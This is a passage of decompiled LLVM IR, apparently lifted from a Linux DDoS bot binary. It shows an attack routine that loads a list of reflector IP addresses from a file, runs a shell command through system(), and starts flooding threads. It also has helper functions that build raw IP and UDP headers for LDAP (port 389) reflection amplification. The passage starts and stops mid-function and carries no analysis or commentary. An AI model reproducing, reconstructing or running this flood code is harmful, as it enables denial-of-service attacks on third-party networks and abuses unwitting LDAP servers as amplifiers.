  store i32 %v2_804d4c1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804d475, i32* %eax.global-to-local, align 4
  %v2_804d4c9 = load i32, i32* %v1_804d478, align 4
  store i32 %v2_804d4c9, i32* @ebx, align 4
  store i32 %v1_804d475, i32* %eax.global-to-local, align 4
  %v2_804d4d1 = load i32, i32* %v1_804d478, align 4
  store i32 %v2_804d4d1, i32* @esi, align 4
  store i32 %v1_804d475, i32* %eax.global-to-local, align 4
  %v2_804d4d9 = load i32, i32* %v1_804d478, align 4
  store i32 %v1_804d49e, i32* @edi, align 4
  %v2_804d4fe = ptrtoint i32* %stack_var_-1104 to i32
  store i32 %v2_804d4fe, i32* %eax.global-to-local, align 4
  %v9_804d507 = call i32 @__GI_snprintf(i32 %v2_804d4fe, i32 %v1_804d49e, i32 ptrtoint ([166 x i8]* @global_var_806a330.126 to i32), i32 %v2_804d4d9, i32 %v2_804d4d1, i32 %v2_804d4c9, i32 %v2_804d4c1)
  store i32 %v2_804d4fe, i32* %eax.global-to-local, align 4
  %v2_804d515 = call i32 @system(i32 %v2_804d4fe)
  store i32 %v2_804d515, i32* %eax.global-to-local, align 4
  %v3_804d521 = call i32 @__GI_time(i32* null)
  store i32 %v3_804d521, i32* %eax.global-to-local, align 4
  %v2_804d529 = call i32 @srand(i32 %v3_804d521)
  store i32 0, i32* @global_var_807f300.80, align 256
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804d54c = call i32 @malloc(i32 128)
  store i32 %v2_804d54c, i32* %edx.global-to-local, align 4
  %v1_804d55a = inttoptr i32 %v2_804d54c to i8*
  store i32 %v2_804d54c, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 128, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804d561 = call i8* @_memset(i8* %v1_804d55a, i32 0, i32 128)
  %v6_804d561 = ptrtoint i8* %v5_804d561 to i32
  store i32 %v6_804d561, i32* %ecx.global-to-local, align 4
  %v0_804d563 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d56b = add i32 %arg4, 16
  store i32 %v1_804d56b, i32* %eax.global-to-local, align 4
  %v1_804d56e = inttoptr i32 %v1_804d56b to i32*
  %v2_804d56e = load i32, i32* %v1_804d56e, align 4
  store i32 %v2_804d56e, i32* %eax.global-to-local, align 4
  %v2_804d573 = call i32 @atol(i32 %v2_804d56e)
  %v1_804d57e = add i32 %arg4, 20
  store i32 %v1_804d57e, i32* %eax.global-to-local, align 4
  %v1_804d581 = inttoptr i32 %v1_804d57e to i32*
  %v2_804d581 = load i32, i32* %v1_804d581, align 4
  store i32 %v2_804d581, i32* %eax.global-to-local, align 4
  %v2_804d586 = call i32 @atol(i32 %v2_804d581)
  store i32 %v2_804d586, i32* @eax, align 4
  store i32 0, i32* @global_var_807e1a8.89, align 8
  store i64 0, i64* @global_var_807e2e0.88, align 32
  %v3_804d5b8 = call i32 @__GI_fopen(i32 ptrtoint ([7 x i8]* @global_var_806a3d6.127 to i32), i32 ptrtoint ([2 x i8]* @global_var_8069c83.83 to i32))
  store i32 %v3_804d5b8, i32* %eax.global-to-local, align 4
  %v4_804d738 = inttoptr i32 %v0_804d563 to i8*
  %v1_804d5d3 = and i32 %v0_804d563, -256
  %v5_804d639 = add i32 %v0_804d563, -1
  br label %dec_label_pc_804d727.outer

dec_label_pc_804d5c5:                             ; preds = %dec_label_pc_804d727
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804d5d3, i32* %eax.global-to-local, align 4
  %v3_804d5dc = call i32 @_strlen(i8* %v4_804d738)
  %v4_804d5dc = mul i32 %v3_804d5dc, -1
  %v5_804d5dc = add i32 %v4_804d5dc, -2
  store i32 %v5_804d5dc, i32* %ecx.global-to-local, align 4
  %v5_804d5e3 = sub i32 %v0_804d563, %v4_804d5dc
  %v1_804d5e6 = add i32 %v5_804d5e3, -1
  store i32 %v1_804d5e6, i32* %eax.global-to-local, align 4
  %v1_804d5e7 = inttoptr i32 %v1_804d5e6 to i8*
  %v2_804d5e7 = load i8, i8* %v1_804d5e7, align 1
  %v3_804d5e7 = zext i8 %v2_804d5e7 to i32
  store i32 %v3_804d5e7, i32* %eax.global-to-local, align 4
  %v10_804d5ea = icmp eq i8 %v2_804d5e7, 10
  br i1 %v10_804d5ea, label %dec_label_pc_804d61b, label %dec_label_pc_804d5ee

dec_label_pc_804d5ee:                             ; preds = %dec_label_pc_804d5c5
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804d5d3, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804d563, i32* @edi, align 4
  %v3_804d605 = call i32 @_strlen(i8* %v4_804d738)
  %v4_804d605 = mul i32 %v3_804d605, -1
  %v5_804d605 = add i32 %v4_804d605, -2
  store i32 %v5_804d605, i32* @ecx, align 4
  %v5_804d60c = sub i32 %v0_804d563, %v4_804d605
  %v1_804d60f = add i32 %v5_804d60c, -1
  store i32 %v1_804d60f, i32* %eax.global-to-local, align 4
  %v1_804d610 = inttoptr i32 %v1_804d60f to i8*
  %v2_804d610 = load i8, i8* %v1_804d610, align 1
  %v3_804d610 = zext i8 %v2_804d610 to i32
  store i32 %v3_804d610, i32* %eax.global-to-local, align 4
  %v10_804d613 = icmp eq i8 %v2_804d610, 13
  %v1_804d615 = icmp eq i1 %v10_804d613, false
  br i1 %v1_804d615, label %dec_label_pc_804d727, label %dec_label_pc_804d61b

dec_label_pc_804d61b:                             ; preds = %dec_label_pc_804d5ee, %dec_label_pc_804d5c5
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804d5d3, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804d563, i32* @edi, align 4
  %v3_804d632 = call i32 @_strlen(i8* %v4_804d738)
  %v4_804d632 = mul i32 %v3_804d632, -1
  %v5_804d632 = add i32 %v4_804d632, -2
  store i32 %v5_804d632, i32* @ecx, align 4
  %v1_804d63c = sub i32 %v5_804d639, %v4_804d632
  %v1_804d63d = inttoptr i32 %v1_804d63c to i8*
  store i8 0, i8* %v1_804d63d, align 1
  %v0_804d640 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804d640, i32* %eax.global-to-local, align 4
  %v1_804d645 = icmp eq i32 %v0_804d640, 0
  %v1_804d647 = icmp eq i1 %v1_804d645, false
  %v2_804d6b9 = call i32 @malloc(i32 540)
  store i32 %v2_804d6b9, i32* %eax.global-to-local, align 4
  br i1 %v1_804d647, label %dec_label_pc_804d6b2, label %dec_label_pc_804d649

dec_label_pc_804d649:                             ; preds = %dec_label_pc_804d61b
  store i32 %v2_804d6b9, i32* @global_var_807f300.80, align 256
  store i32 %v2_804d6b9, i32* %eax.global-to-local, align 4
  %v1_804d65f = inttoptr i32 %v2_804d6b9 to i32*
  store i32 0, i32* %v1_804d65f, align 4
  %v0_804d665 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d665 = add i32 %v0_804d665, 4
  %v2_804d665 = inttoptr i32 %v1_804d665 to i32*
  store i32 0, i32* %v2_804d665, align 4
  %v0_804d66c = load i32, i32* %eax.global-to-local, align 4
  %v1_804d66c = add i32 %v0_804d66c, 8
  %v2_804d66c = inttoptr i32 %v1_804d66c to i32*
  store i32 0, i32* %v2_804d66c, align 4
  %v0_804d673 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d673 = add i32 %v0_804d673, 12
  %v2_804d673 = inttoptr i32 %v1_804d673 to i32*
  store i32 0, i32* %v2_804d673, align 4
  %v0_804d67a = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804d67a, i32* @ebx, align 4
  store i32 %v0_804d563, i32* %eax.global-to-local, align 4
  %v2_804d686 = call i32 @inet_addr(i32 %v0_804d563)
  %v1_804d68b = load i32, i32* @ebx, align 4
  %v2_804d68b = add i32 %v1_804d68b, 4
  %v3_804d68b = inttoptr i32 %v2_804d68b to i32*
  store i32 %v2_804d686, i32* %v3_804d68b, align 4
  %v0_804d68e = load i32, i32* @global_var_807f300.80, align 256
  %v2_804d699 = add i32 %v0_804d68e, 532
  %v3_804d699 = inttoptr i32 %v2_804d699 to i32*
  store i32 %v0_804d68e, i32* %v3_804d699, align 4
  %v0_804d69f = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804d69f, i32* @edx, align 4
  store i32 %v0_804d69f, i32* %eax.global-to-local, align 4
  %v2_804d6aa = add i32 %v0_804d69f, 536
  %v3_804d6aa = inttoptr i32 %v2_804d6aa to i32*
  store i32 %v0_804d69f, i32* %v3_804d6aa, align 4
  br label %dec_label_pc_804d724

dec_label_pc_804d6b2:                             ; preds = %dec_label_pc_804d61b
  store i32 %v2_804d6b9, i32* @edx, align 4
  store i32 540, i32* %eax.global-to-local, align 4
  %v4_804d6d7 = inttoptr i32 %v2_804d6b9 to i8*
  %v6_804d6da = call i32 @__GI_memset(i8* %v4_804d6d7, i32 0, i32 540)
  store i32 %v0_804d563, i32* %eax.global-to-local, align 4
  %v2_804d6e5 = call i32 @inet_addr(i32 %v0_804d563)
  %v2_804d6ef = add i32 %v2_804d6b9, 4
  %v3_804d6ef = inttoptr i32 %v2_804d6ef to i32*
  store i32 %v2_804d6e5, i32* %v3_804d6ef, align 4
  %v0_804d6f2 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804d6f2, i32* %edx.global-to-local, align 4
  %v2_804d6fb = add i32 %v2_804d6b9, 536
  %v3_804d6fb = inttoptr i32 %v2_804d6fb to i32*
  store i32 %v0_804d6f2, i32* %v3_804d6fb, align 4
  %v0_804d701 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804d701, i32* %eax.global-to-local, align 4
  %v1_804d706 = add i32 %v0_804d701, 532
  %v2_804d706 = inttoptr i32 %v1_804d706 to i32*
  %v3_804d706 = load i32, i32* %v2_804d706, align 4
  %v2_804d70f = add i32 %v2_804d6b9, 532
  %v3_804d70f = inttoptr i32 %v2_804d70f to i32*
  store i32 %v3_804d706, i32* %v3_804d70f, align 4
  %v0_804d715 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804d715, i32* @edx, align 4
  store i32 %v2_804d6b9, i32* %eax.global-to-local, align 4
  %v2_804d71e = add i32 %v0_804d715, 532
  %v3_804d71e = inttoptr i32 %v2_804d71e to i32*
  store i32 %v2_804d6b9, i32* %v3_804d71e, align 4
  br label %dec_label_pc_804d724

dec_label_pc_804d724:                             ; preds = %dec_label_pc_804d649, %dec_label_pc_804d6b2
  br label %dec_label_pc_804d727.outer

dec_label_pc_804d727.outer:                       ; preds = %dec_label_pc_804d724, %dec_label_pc_804d4b3
  br label %dec_label_pc_804d727

dec_label_pc_804d727:                             ; preds = %dec_label_pc_804d727.outer, %dec_label_pc_804d5ee
  store i32 %v0_804d563, i32* %eax.global-to-local, align 4
  %v5_804d73b = call i32 @fgets(i32 %v0_804d563, i32 128, i32 %v3_804d5b8)
  store i32 %v5_804d73b, i32* %eax.global-to-local, align 4
  %v1_804d740 = icmp eq i32 %v5_804d73b, 0
  %v1_804d742 = icmp eq i1 %v1_804d740, false
  br i1 %v1_804d742, label %dec_label_pc_804d5c5, label %dec_label_pc_804d748

dec_label_pc_804d748:                             ; preds = %dec_label_pc_804d727
  %v0_804d748 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804d748, i32* %eax.global-to-local, align 4
  %v1_804d74d = add i32 %v0_804d748, 532
  %v2_804d74d = inttoptr i32 %v1_804d74d to i32*
  %v3_804d74d = load i32, i32* %v2_804d74d, align 4
  %v2_804d759 = mul i32 %v2_804d573, 4
  %v1_804d75f = add i32 %v2_804d759, 30
  %v2_804d762 = and i32 %v1_804d75f, -16
  %v0_804d768 = load i32, i32* @esp, align 4
  %v2_804d768 = sub i32 %v0_804d768, %v2_804d762
  %v1_804d77a = add i32 %v2_804d768, 47
  %v2_804d77d = and i32 %v1_804d77a, -16
  %v1_804d79e = add i32 %arg4, 4
  store i32 %v1_804d79e, i32* %eax.global-to-local, align 4
  %v1_804d7a1 = inttoptr i32 %v1_804d79e to i32*
  %v2_804d7a1 = load i32, i32* %v1_804d7a1, align 4
  store i32 %v2_804d7a1, i32* %eax.global-to-local, align 4
  %v2_804d7a3 = inttoptr i32 %v2_804d768 to i32*
  store i32 %v2_804d7a1, i32* %v2_804d7a3, align 4
  %v1_804d7a6 = call i32 @inet_addr(i32 %v2_804d77d)
  store i32 %v2_804d573, i32* %edx.global-to-local, align 4
  %v2_804d7bc = mul i32 %v2_804d573, 24
  %v1_804d7c2 = add i32 %v2_804d7bc, 30
  %v2_804d7c5 = and i32 %v1_804d7c2, -16
  %v0_804d7cb = load i32, i32* @esp, align 4
  %v2_804d7cb = sub i32 %v0_804d7cb, %v2_804d7c5
  %v1_804d7dd = add i32 %v2_804d7cb, 47
  %v2_804d7e0 = and i32 %v1_804d7dd, -16
  store i32 %v2_804d7e0, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804d8b059 = icmp sgt i32 %v2_804d573, 0
  br i1 %v5_804d8b059, label %dec_label_pc_804d801.lr.ph, label %dec_label_pc_804d8b6

dec_label_pc_804d801.lr.ph:                       ; preds = %dec_label_pc_804d748
  %v3_804d833 = or i32 %v2_804d7e0, 8
  br label %dec_label_pc_804d801

dec_label_pc_804d801:                             ; preds = %dec_label_pc_804d801, %dec_label_pc_804d801.lr.ph
  %storemerge60 = phi i32 [ 0, %dec_label_pc_804d801.lr.ph ], [ %v4_804d8a7, %dec_label_pc_804d801 ]
  %v1_804d80d = mul i32 %storemerge60, 24
  %v3_804d817 = add i32 %v1_804d80d, %v2_804d7e0
  %v4_804d817 = inttoptr i32 %v3_804d817 to i32*
  store i32 %storemerge60, i32* %v4_804d817, align 8
  store i32 %v2_804d7e0, i32* %ecx.global-to-local, align 4
  store i32 %v1_804d80d, i32* %edx.global-to-local, align 4
  %v4_804d833 = add i32 %v3_804d833, %v1_804d80d
  %v5_804d833 = inttoptr i32 %v4_804d833 to i32*
  store i32 2, i32* %v5_804d833, align 8
  %v1_804d83d = load i32, i32* %edx.global-to-local, align 4
  %v2_804d83d = load i32, i32* %ecx.global-to-local, align 4
  %v3_804d83d = add i32 %v1_804d83d, 12
  %v4_804d83d = add i32 %v3_804d83d, %v2_804d83d
  %v5_804d83d = inttoptr i32 %v4_804d83d to i32*
  store i32 %v1_804d7a6, i32* %v5_804d83d, align 4
  %v1_804d847 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d847 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804d847 = add i32 %v1_804d847, 16
  %v4_804d847 = add i32 %v3_804d847, %v2_804d847
  %v5_804d847 = inttoptr i32 %v4_804d847 to i32*
  %v1_804d851 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d851 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804d851 = add i32 %v1_804d851, 20
  %v4_804d851 = add i32 %v3_804d851, %v2_804d851
  %v5_804d851 = inttoptr i32 %v4_804d851 to i32*
  %v1_804d866 = or i32 %v3_804d817, 4
  %v2_804d86c = inttoptr i32 %v1_804d866 to i32*
  store i32 %v3_804d74d, i32* %v2_804d86c, align 4
  store i32 %v3_804d817, i32* @ecx, align 4
  store i32 %v2_804d77d, i32* %edx.global-to-local, align 4
  %v2_804d885 = mul i32 %storemerge60, 4
  %v2_804d888 = add i32 %v2_804d885, %v2_804d77d
  store i32 %v2_804d888, i32* %eax.global-to-local, align 4
  %v1_804d88b = load i32, i32* @esp, align 4
  %v2_804d88b = add i32 %v1_804d88b, 12
  %v3_804d88b = inttoptr i32 %v2_804d88b to i32*
  store i32 %v3_804d817, i32* %v3_804d88b, align 4
  %v0_804d88f = load i32, i32* @esp, align 4
  %v1_804d88f = add i32 %v0_804d88f, 8
  %v2_804d88f = inttoptr i32 %v1_804d88f to i32*
  store i32 134533416, i32* %v2_804d88f, align 4
  %v0_804d897 = load i32, i32* @esp, align 4
  %v1_804d897 = add i32 %v0_804d897, 4
  %v2_804d897 = inttoptr i32 %v1_804d897 to i32*
  store i32 0, i32* %v2_804d897, align 4
  %v0_804d89f = load i32, i32* %eax.global-to-local, align 4
  %v1_804d89f = load i32, i32* @esp, align 4
  %v2_804d89f = inttoptr i32 %v1_804d89f to i32*
  store i32 %v0_804d89f, i32* %v2_804d89f, align 4
  %v0_804d8a2 = call i32 @pthread_create()
  %v4_804d8a7 = add nuw nsw i32 %storemerge60, 1
  store i32 %v4_804d8a7, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804d8a7, %v2_804d573
  br i1 %exitcond, label %dec_label_pc_804d8aa.dec_label_pc_804d8b6_crit_edge, label %dec_label_pc_804d801

dec_label_pc_804d8aa.dec_label_pc_804d8b6_crit_edge: ; preds = %dec_label_pc_804d801
  %v1_804d8be.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d8b6

dec_label_pc_804d8b6:                             ; preds = %dec_label_pc_804d8aa.dec_label_pc_804d8b6_crit_edge, %dec_label_pc_804d748
  %v1_804d8be = phi i32 [ %v1_804d8be.pre, %dec_label_pc_804d8aa.dec_label_pc_804d8b6_crit_edge ], [ %v2_804d7cb, %dec_label_pc_804d748 ]
  %storemerge.lcssa = phi i32 [ %v2_804d573, %dec_label_pc_804d8aa.dec_label_pc_804d8b6_crit_edge ], [ 0, %dec_label_pc_804d748 ]
  store i32 %v1_804d79e, i32* %eax.global-to-local, align 4
  %v2_804d8bc = load i32, i32* %v1_804d7a1, align 4
  %v2_804d8be = add i32 %v1_804d8be, 12
  %v3_804d8be = inttoptr i32 %v2_804d8be to i32*
  store i32 %v2_804d8bc, i32* %v3_804d8be, align 4
  %v1_804d8c5 = load i32, i32* @esp, align 4
  %v2_804d8c5 = add i32 %v1_804d8c5, 8
  %v3_804d8c5 = inttoptr i32 %v2_804d8c5 to i32*
  store i32 %arg2, i32* %v3_804d8c5, align 4
  %v0_804d8c9 = load i32, i32* @esp, align 4
  %v1_804d8c9 = add i32 %v0_804d8c9, 4
  %v2_804d8c9 = inttoptr i32 %v1_804d8c9 to i32*
  store i32 ptrtoint ([32 x i8]* @global_var_806a3e0.128 to i32), i32* %v2_804d8c9, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804d8d4 = load i32, i32* @esp, align 4
  %v2_804d8d4 = inttoptr i32 %v1_804d8d4 to i32*
  store i32 %arg1, i32* %v2_804d8d4, align 4
  %v2_804d8d7 = call i32 @Send(i32 %storemerge.lcssa, i32 128)
  store i32 %v1_804d46a, i32* %eax.global-to-local, align 4
  %v2_804d8e9 = load i32, i32* %v1_804d46d, align 4
  store i32 %v2_804d8e9, i32* %eax.global-to-local, align 4
  %v1_804d8eb = load i32, i32* @esp, align 4
  %v2_804d8eb = inttoptr i32 %v1_804d8eb to i32*
  store i32 %v2_804d8e9, i32* %v2_804d8eb, align 4
  %v1_804d8ee = call i32 @atol(i32 0)
  %v9_804d8f3 = mul i32 %v1_804d8ee, 20
  store i32 %v9_804d8f3, i32* %eax.global-to-local, align 4
  %v7_804d8fa = icmp sgt i32 %v9_804d8f3, 0
  br i1 %v7_804d8fa, label %dec_label_pc_804d900, label %dec_label_pc_804d9bd

dec_label_pc_804d900:                             ; preds = %dec_label_pc_804d8b6
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v1_804d90f = load i32, i32* @esp, align 4
  %v2_804d90f = inttoptr i32 %v1_804d90f to i32*
  store i32 50000, i32* %v2_804d90f, align 4
  %v2_804d912 = call i32 @usleep(i64 0)
  %v0_804d917 = load i64, i64* @global_var_807e2e0.88, align 8
  %sext = mul i64 %v0_804d917, 4294967296
  %v2_804d920 = sdiv i64 %sext, 4294967296
  %v4_804d920 = mul nsw i64 %v2_804d920, 20
  %v5_804d920 = trunc i64 %v4_804d920 to i32
  store i32 %v5_804d920, i32* %edx.global-to-local, align 4
  %tmp62 = icmp ugt i32 %v5_804d920, %v2_804d586
  %v0_804d94f = load i32, i32* @global_var_807e1a8.89, align 8
  store i32 %v0_804d94f, i32* %eax.global-to-local, align 4
  br i1 %tmp62, label %dec_label_pc_804d92a, label %dec_label_pc_804d94f

dec_label_pc_804d92a:                             ; preds = %dec_label_pc_804d900
  %tmp51 = icmp slt i32 %v0_804d94f, 1
  %tmp52 = icmp eq i1 %tmp51, false
  br i1 %tmp52, label %dec_label_pc_804d942, label %dec_label_pc_804d933

dec_label_pc_804d933:                             ; preds = %dec_label_pc_804d92a
  %v0_804d933 = load i32, i32* @global_var_8070d88.90, align 8
  %v1_804d938 = add i32 %v0_804d933, 100
  store i32 %v1_804d938, i32* %eax.global-to-local, align 4
  store i32 %v1_804d938, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804d97d

dec_label_pc_804d942:                             ; preds = %dec_label_pc_804d92a
  %v1_804d947 = add i32 %v0_804d94f, -1
  store i32 %v1_804d947, i32* %eax.global-to-local, align 4
  store i32 %v1_804d947, i32* @global_var_807e1a8.89, align 8
  br label %dec_label_pc_804d97d

dec_label_pc_804d94f:                             ; preds = %dec_label_pc_804d900
  %v1_804d954 = add i32 %v0_804d94f, 1
  store i32 %v1_804d954, i32* @global_var_807e1a8.89, align 8
  %v0_804d95a = load i32, i32* @global_var_8070d88.90, align 8
  store i32 %v0_804d95a, i32* %eax.global-to-local, align 4
  %v1_804d95f = add i32 %v0_804d95a, -25
  %v5_804d95f = icmp ult i32 %v0_804d95a, 25
  %v9_804d95f = icmp eq i32 %v1_804d95f, 0
  %v2_804d962 = or i1 %v5_804d95f, %v9_804d95f
  br i1 %v2_804d962, label %dec_label_pc_804d973, label %dec_label_pc_804d964

dec_label_pc_804d964:                             ; preds = %dec_label_pc_804d94f
  store i32 %v1_804d95f, i32* %eax.global-to-local, align 4
  store i32 %v1_804d95f, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804d97d

dec_label_pc_804d973:                             ; preds = %dec_label_pc_804d94f
  store i32 0, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804d97d

dec_label_pc_804d97d:                             ; preds = %dec_label_pc_804d964, %dec_label_pc_804d942, %dec_label_pc_804d933, %dec_label_pc_804d973
  store i64 0, i64* @global_var_807e2e0.88, align 32
  %v5_804d99e = add i32 %v2_804d46d, %v3_804d45f
  br label %dec_label_pc_804d987

dec_label_pc_804d987:                             ; preds = %dec_label_pc_804d9b8, %dec_label_pc_804d97d
  %stack_var_-60.0 = phi i32 [ %tmp, %dec_label_pc_804d97d ], [ %v4_804d9b8, %dec_label_pc_804d9b8 ]
  %v7_804d98b = icmp sgt i32 %stack_var_-60.0, 99
  br i1 %v7_804d98b, label %dec_label_pc_804d98d, label %dec_label_pc_804d9b8

dec_label_pc_804d98d:                             ; preds = %dec_label_pc_804d987
  %v0_804d98d = load i32, i32* @esp, align 4
  %v1_804d98d = inttoptr i32 %v0_804d98d to i32*
  store i32 0, i32* %v1_804d98d, align 4
  %v2_804d994 = call i32 @__GI_time(i32* null)
  store i32 %v2_804d994, i32* %edx.global-to-local, align 4
  store i32 %v5_804d99e, i32* %eax.global-to-local, align 4
  %v7_804d9a1 = icmp ult i32 %v2_804d994, %v5_804d99e
  br i1 %v7_804d9a1, label %dec_label_pc_804d9b8, label %dec_label_pc_804d9a5

dec_label_pc_804d9a5:                             ; preds = %dec_label_pc_804d98d
  %v0_804d9a5 = load i32, i32* @esp, align 4
  %v1_804d9a5 = inttoptr i32 %v0_804d9a5 to i32*
  store i32 0, i32* %v1_804d9a5, align 4
  %v1_804d9ac = call i32 @__GI_exit(i32 0)
  store i32 %v1_804d9ac, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d9b8

dec_label_pc_804d9b8:                             ; preds = %dec_label_pc_804d9a5, %dec_label_pc_804d98d, %dec_label_pc_804d987
  %stack_var_-60.1 = phi i32 [ %stack_var_-60.0, %dec_label_pc_804d987 ], [ 0, %dec_label_pc_804d98d ], [ 0, %dec_label_pc_804d9a5 ]
  %v4_804d9b8 = add i32 %stack_var_-60.1, 1
  br label %dec_label_pc_804d987

dec_label_pc_804d9bd:                             ; preds = %dec_label_pc_804d8b6
  %v0_804d9bd = load i32, i32* @esp, align 4
  %v1_804d9bd = inttoptr i32 %v0_804d9bd to i32*
  store i32 0, i32* %v1_804d9bd, align 4
  %v1_804d9c4 = call i32 @__GI_exit(i32 %tmp)
  store i32 %v1_804d9c4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d9c9

dec_label_pc_804d9c9:                             ; preds = %dec_label_pc_804d458, %entry, %dec_label_pc_804d9bd
  %v0_804d9d6 = phi i32 [ %v1_804d49e, %dec_label_pc_804d458 ], [ %v2_804d3ee, %entry ], [ %v1_804d9c4, %dec_label_pc_804d9bd ]
  ret i32 %v0_804d9d6

; uselistorder directives
  uselistorder i32 %v1_804d95f, { 1, 0, 2 }
  uselistorder i32 %v0_804d94f, { 2, 1, 0, 3 }
  uselistorder i32 %v9_804d8f3, { 1, 0 }
  uselistorder i32 %v3_804d817, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804d80d, { 0, 2, 1 }
  uselistorder i32 %storemerge60, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804d7e0, { 1, 2, 3, 0 }
  uselistorder i32 %v2_804d77d, { 0, 2, 1 }
  uselistorder i32 %v0_804d69f, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d68e, { 1, 0 }
  uselistorder i32 %v2_804d6b9, { 1, 0, 2, 3, 4, 8, 9, 7, 6, 5, 10 }
  uselistorder i32 %v2_804d573, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v0_804d563, { 12, 10, 7, 6, 5, 4, 8, 1, 3, 2, 0, 9, 11 }
  uselistorder i32 %v4_804d4a6, { 1, 0 }
  uselistorder i32 %v4_804d42c, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 16, 14, 15, 68, 17, 18, 19, 22, 40, 20, 21, 23, 24, 25, 27, 28, 29, 30, 31, 26, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62, 64, 65, 67, 66 }
  uselistorder i32 %arg4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804d9c9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d97d, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d724, { 1, 0 }
  uselistorder label %dec_label_pc_804d458, { 1, 0 }
  uselistorder label %dec_label_pc_804d42c, { 1, 0 }
}

define i32 @setup_ldap_ip_header(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804d9d7 = load i32, i32* @ebp, align 4
  store i32 %v0_804d9d7, i32* %stack_var_-4, align 4
  %v4_804d9dd = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v1_804d9f8 = add i32 %v4_804d9dd, 1
  %v2_804d9f8 = inttoptr i32 %v1_804d9f8 to i8*
  store i8 0, i8* %v2_804d9f8, align 1
  %v1_804d9ff = add i32 %v4_804d9dd, 2
  %v2_804d9ff = inttoptr i32 %v1_804d9ff to i16*
  store i16 79, i16* %v2_804d9ff, align 2
  %v2_804da0c = call i32 @htonl(i32 54321)
  %v1_804da11 = urem i32 %v2_804da0c, 65536
  store i32 %v1_804da11, i32* @edx, align 4
  %v1_804da17 = trunc i32 %v2_804da0c to i16
  %v3_804da17 = add i32 %v4_804d9dd, 4
  %v4_804da17 = inttoptr i32 %v3_804da17 to i16*
  store i16 %v1_804da17, i16* %v4_804da17, align 2
  %v1_804da1e = add i32 %v4_804d9dd, 6
  %v2_804da1e = inttoptr i32 %v1_804da1e to i16*
  store i16 0, i16* %v2_804da1e, align 2
  %v1_804da27 = add i32 %v4_804d9dd, 8
  %v2_804da27 = inttoptr i32 %v1_804da27 to i8*
  store i8 -1, i8* %v2_804da27, align 1
  %v1_804da2e = add i32 %v4_804d9dd, 9
  %v2_804da2e = inttoptr i32 %v1_804da2e to i8*
  store i8 17, i8* %v2_804da2e, align 1
  %v1_804da35 = add i32 %v4_804d9dd, 10
  %v2_804da35 = inttoptr i32 %v1_804da35 to i16*
  store i16 0, i16* %v2_804da35, align 2
  %v2_804da42 = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_8069b65.78 to i32))
  %v3_804da4c = add i32 %v4_804d9dd, 12
  %v4_804da4c = inttoptr i32 %v3_804da4c to i32*
  store i32 %v2_804da42, i32* %v4_804da4c, align 4
  %v2_804da4f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804da4f, i32* @ebp, align 4
  ret i32 %v4_804d9dd

; uselistorder directives
  uselistorder i32 %v2_804da0c, { 1, 0 }
  uselistorder [14 x i8]* @global_var_8069b65.78, { 1, 0 }
}

define i32 @setup_ldap_udp_header(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804da55 = load i32, i32* @esi, align 4
  store i32 %v0_804da55, i32* %stack_var_-12, align 4
  %v2_804da60 = call i32 @htons(i16 5678)
  %v4_804da68 = ptrtoint i16* %arg1 to i32
  %v1_804da6b = trunc i32 %v2_804da60 to i16
  store i16 %v1_804da6b, i16* %arg1, align 2
  %v2_804da75 = call i32 @htons(i16 389)
  %v1_804da80 = trunc i32 %v2_804da75 to i16
